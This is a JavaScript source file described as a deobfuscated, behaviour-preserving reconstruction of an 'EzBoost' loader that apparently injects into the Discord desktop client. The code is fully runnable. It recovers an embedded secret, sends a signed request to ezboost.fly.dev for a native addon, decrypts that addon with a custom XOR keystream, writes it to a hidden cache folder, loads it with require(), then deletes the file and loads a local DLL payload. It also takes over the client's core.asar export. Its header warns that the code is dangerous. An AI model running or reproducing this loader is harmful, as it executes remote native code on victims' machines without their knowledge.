'use strict';

/**
 * Readable, behavior-preserving reconstruction of the supplied obfuscated loader.
 * The obfuscator.io string table reaches its checksum after 58 left rotations;
 * every resulting lookup has been inlined and every generated identifier removed.
 *
 * Complete flow:
 *
 * - Start an asynchronous node-bytes request, while independently trying the local
 *   synchronous fallbacks ./core.asar and then ../app.asar.
 * - Download node-bytes with a signed nonce/timestamp, decrypt it when X-Ezb-Enc is
 *   "1", save it as a random .node file, and execute it with require().
 * - Delete that temporary addon after a successful require(), then pass a local
 *   payload path to its loadFromFile() export.
 * - The local payload path comes from EZBOOST_LOCAL_PAYLOAD or falls back to
 *   core_assembly_stubbed.dll beside this loader.
 *
 * Crypto summary:
 *
 * 1. The three embedded hex constants are inputs to a source-level secret-hiding
 *    construction. They are not AES keys.
 * 2. That construction recovers the 31-byte ASCII protocol secret
 *    "e44f96f1d5713732eb696a875424e58".
 * 3. Node-bytes requests are authenticated with:
 *      HMAC-SHA256(secret, `${resource}|${nonce}|${unixSeconds}`)
 * 4. Encrypted responses use a nonstandard stream construction. For each 32-byte
 *    block, the keystream is:
 *      SHA256(UTF8(secret) || UTF8(nonceHex) || uint32LE(counter))
 *    The response bytes are XORed with those blocks. This is not AES and does not
 *    authenticate the response.
 *
 * This file preserves the original loader's dangerous behavior: downloaded native
 * code is written to disk and loaded with require(). Do not run it on an untrusted
 * system. The companion downloader never executes downloaded bytes.
 */

const fs = require('fs');
const https = require('https');
const path = require('path');
const os = require('os');
const crypto = require('crypto');

const SERVICE_ORIGIN = 'https://ezboost.fly.dev';
const NODE_BYTES_ENDPOINT = `${SERVICE_ORIGIN}/api/public/node-bytes`;
const ENCRYPTION_HEADER = 'x-ezb-enc';
const NODE_REQUEST_TIMEOUT_MS = 15_000;

// Inputs to the custom source-level secret-hiding construction.
const SECRET_MD5_SEED_HEX = '3830929f1247d0fdd6c82bddfb19121b';
const SECRET_CUSTOM_HASH_SEED_HEX = 'fcf7a7aca3161aff873b27acc5aae827';
const MASKED_PROTOCOL_SECRET_HEX =
  'd1a2b8da6674c0b4e193c9cc4892fd582751317bbf6c062ca0279084a48c48';
const EXPECTED_PROTOCOL_SECRET = 'e44f96f1d5713732eb696a875424e58';

const CACHE_DIRECTORY = path.join(
  os.homedir(),
  'AppData',
  'Roaming',
  'discord',
  '.ezb-cache',
);
const INDEX_LOG_PATH = path.join(CACHE_DIRECTORY, 'idx.log');
const DESKTOP_DEBUG_LOG_PATH = path.join(
  os.homedir(),
  'Desktop',
  'ezboost_debug.txt',
);

/**
 * Bespoke 32-byte mixing function used only to conceal the protocol secret in the
 * JavaScript source. It is reproduced exactly; it is not a standard hash.
 */
function custom32ByteHash(input) {
  let fnvState = 0x811c9dc5 >>> 0;
  let secondaryState = 0x01000193 >>> 0;
  const output = Buffer.alloc(32);

  for (let index = 0; index < input.length; index++) {
    fnvState = Math.imul(fnvState ^ input[index], 0x01000193) >>> 0;
    secondaryState = (
      (Math.imul((secondaryState + input[index]) >>> 0, 0x85ebca6b) >>> 0) ^
      (secondaryState >>> 13)
    ) >>> 0;
    output[index % 32] = (
      output[index % 32] ^
      ((fnvState ^ (secondaryState >>> 5)) & 0xff)
    ) & 0xff;
  }

  for (let round = 0; round < 3; round++) {
    for (let index = 0; index < 32; index++) {
      fnvState = Math.imul(
        fnvState ^ ((output[index] + index) & 0xff),
        0x01000193,
      ) >>> 0;
      output[index] = (
        output[index] +
        ((fnvState >>> ((index & 3) * 4)) & 0xff) +
        round
      ) & 0xff;
    }
  }

  return output;
}

/**
 * Expands the two secret-hiding inputs into enough mask bytes. The block counter is
 * only two little-endian bytes in this source-obfuscation layer.
 */
function expandSecretMaskKeystream(length, keyParts) {
  let state = custom32ByteHash(Buffer.concat(keyParts));
  const output = Buffer.alloc(length);
  let outputOffset = 0;
  let counter = 0;

  while (outputOffset < length) {
    const counterBytes = Buffer.from([
      counter & 0xff,
      (counter >>> 8) & 0xff,
    ]);
    const block = custom32ByteHash(Buffer.concat([state, counterBytes]));
    const copyLength = Math.min(32, length - outputOffset);
    block.copy(output, outputOffset, 0, copyLength);
    outputOffset += copyLength;
    state = block;
    counter++;
  }

  return output;
}

function recoverProtocolSecret() {
  const maskedSecret = Buffer.from(MASKED_PROTOCOL_SECRET_HEX, 'hex');
  const md5Seed = Buffer.from(SECRET_MD5_SEED_HEX, 'hex');
  const customHashSeed = Buffer.from(SECRET_CUSTOM_HASH_SEED_HEX, 'hex');
  const maskKeystream = expandSecretMaskKeystream(maskedSecret.length, [
    crypto.createHash('md5').update(md5Seed).digest(),
    custom32ByteHash(customHashSeed),
  ]);
  const recoveredSecret = Buffer.alloc(maskedSecret.length);

  for (let index = 0; index < maskedSecret.length; index++) {
    recoveredSecret[index] = maskedSecret[index] ^ maskKeystream[index];
  }

  const secret = recoveredSecret.toString('utf8');
  if (secret !== EXPECTED_PROTOCOL_SECRET) {
    throw new Error('embedded protocol secret failed its known-value check');
  }
  return secret;
}

const CORE_BYTES_HMAC_SECRET = recoverProtocolSecret();

/**
 * Symmetric response transform used for both node-bytes and core-bytes.
 * Applying it twice with the same secret and nonce returns the original bytes.
 */
function xorSha256CounterStream(input, secret, nonceHex) {
  const secretBytes = Buffer.from(secret, 'utf8');
  const nonceBytes = Buffer.from(nonceHex, 'utf8');
  const output = Buffer.alloc(input.length);
  let inputOffset = 0;
  let counter = 0;

  while (inputOffset < input.length) {
    const counterBytes = Buffer.alloc(4);
    counterBytes.writeUInt32LE(counter, 0);
    const keystreamBlock = crypto
      .createHash('sha256')
      .update(Buffer.concat([secretBytes, nonceBytes, counterBytes]))
      .digest();
    const blockLength = Math.min(32, input.length - inputOffset);

    for (let blockOffset = 0; blockOffset < blockLength; blockOffset++) {
      output[inputOffset + blockOffset] =
        input[inputOffset + blockOffset] ^ keystreamBlock[blockOffset];
    }

    inputOffset += blockLength;
    counter++;
  }

  return output;
}

function appendLog(message) {
  const line = `${new Date().toISOString()} ${message}\n`;

  try {
    fs.appendFileSync(INDEX_LOG_PATH, line);
  } catch {
    // The original silently ignores every log failure.
  }

  try {
    // The desktop log is append-only and is never created by this loader.
    if (fs.existsSync(DESKTOP_DEBUG_LOG_PATH)) {
      fs.appendFileSync(DESKTOP_DEBUG_LOG_PATH, line);
    }
  } catch {
    // The original silently ignores every log failure.
  }
}

function signRequest(resourceName, nonceHex, unixSeconds) {
  return crypto
    .createHmac('sha256', CORE_BYTES_HMAC_SECRET)
    .update(`${resourceName}|${nonceHex}|${unixSeconds}`)
    .digest('hex');
}

function buildNodeBytesRequest() {
  const nonceHex = crypto.randomBytes(12).toString('hex');
  const unixSeconds = Math.floor(Date.now() / 1000);
  const macHex = signRequest('node-bytes', nonceHex, unixSeconds);
  const url =
    `${NODE_BYTES_ENDPOINT}?enc=1` +
    `&nonce=${nonceHex}` +
    `&ts=${unixSeconds}` +
    `&mac=${macHex}`;
  return { url, nonceHex };
}

function downloadNodeAddon(url, nonceHex) {
  return new Promise((resolve, reject) => {
    const request = https.get(
      url,
      {
        headers: { 'User-Agent': 'Mozilla/5.0' },
        timeout: NODE_REQUEST_TIMEOUT_MS,
      },
      response => {
        appendLog(`node-bytes status=${response.statusCode}`);

        if (response.statusCode !== 200) {
          response.resume();
          reject(new Error(`status ${response.statusCode}`));
          return;
        }

        const encrypted = response.headers[ENCRYPTION_HEADER] === '1';
        const chunks = [];
        response.on('data', chunk => chunks.push(chunk));
        response.on('end', () => {
          let body = Buffer.concat(chunks);
          if (encrypted) {
            body = xorSha256CounterStream(
              body,
              CORE_BYTES_HMAC_SECRET,
              nonceHex,
            );
          }
          resolve(body);
        });
        response.on('error', reject);
      },
    );

    request.on('timeout', () => {
      request.destroy(
        new Error('node-bytes request timed out after 15s'),
      );
    });
    request.on('error', reject);
  });
}

async function bootstrapRemoteCore() {
  appendLog('index.js started');

  try {
    const nodeRequest = buildNodeBytesRequest();
    const nativeAddonBytes = await downloadNodeAddon(
      nodeRequest.url,
      nodeRequest.nonceHex,
    );
    appendLog(`node-bytes downloaded size=${nativeAddonBytes.length}`);

    try {
      fs.mkdirSync(CACHE_DIRECTORY, { recursive: true });
    } catch {
      // A later write determines whether the loader can continue.
    }

    const addonFilename = `${crypto.randomBytes(8).toString('hex')}.node`;
    let addonPath = path.join(CACHE_DIRECTORY, addonFilename);

    try {
      fs.writeFileSync(addonPath, nativeAddonBytes);
      appendLog(`wrote to cache: ${addonPath}`);
    } catch (cacheWriteError) {
      appendLog(
        `cache write failed, fallback to temp: ${cacheWriteError.message}`,
      );
      addonPath = path.join(os.tmpdir(), addonFilename);
      fs.writeFileSync(addonPath, nativeAddonBytes);
      appendLog(`wrote to temp: ${addonPath}`);
    }

    let nativeAddon;
    try {
      nativeAddon = require(addonPath);
      appendLog('require ok');
    } catch (requireError) {
      appendLog(`require failed: ${requireError.message}`);
      throw requireError;
    }

    try {
      fs.unlinkSync(addonPath);
    } catch {
      // A successfully loaded addon may remain locked; cleanup failure is ignored.
    }

    const payloadPath =
      process.env.EZBOOST_LOCAL_PAYLOAD ||
      path.join(__dirname, 'core_assembly_stubbed.dll');
    console.log(`[EzBoost-Offline] Loading payload from: ${payloadPath}`);

    if (!fs.existsSync(payloadPath)) {
      const message = `Local payload does not exist: ${payloadPath}`;
      console.error(`[EzBoost-Offline] ERROR: ${message}`);
      appendLog(`ERROR: ${message}`);
      return;
    }

    const returnCode = nativeAddon.loadFromFile(payloadPath);
    appendLog(`loadFromFile rc=${returnCode}`);
  } catch (error) {
    appendLog(`ERROR: ${describeError(error)}`);
  }
}

function describeError(error) {
  if (!error) return 'unknown';

  let description =
    `${error.name || error.constructor?.name || 'Error'}: ` +
    `${error.message || String(error)}`;

  if (error.code) {
    description += ` code=${error.code}`;
  }

  if (Array.isArray(error.errors) && error.errors.length) {
    const causes = error.errors.map(cause => {
      const codePrefix = cause?.code ? `${cause.code} ` : '';
      const message = cause?.message ? cause.message : String(cause);
      return codePrefix + message;
    });
    description += ` | causes=[${causes.join('; ')}]`;
  }

  return description;
}

// The asynchronous remote bootstrap begins before the two synchronous fallbacks.
void bootstrapRemoteCore();

try {
  module.exports = require('./core.asar');
} catch {
  try {
    module.exports = require('../app.asar');
  } catch {
    // If both local loads fail, the module retains Node's default empty export.
  }
}
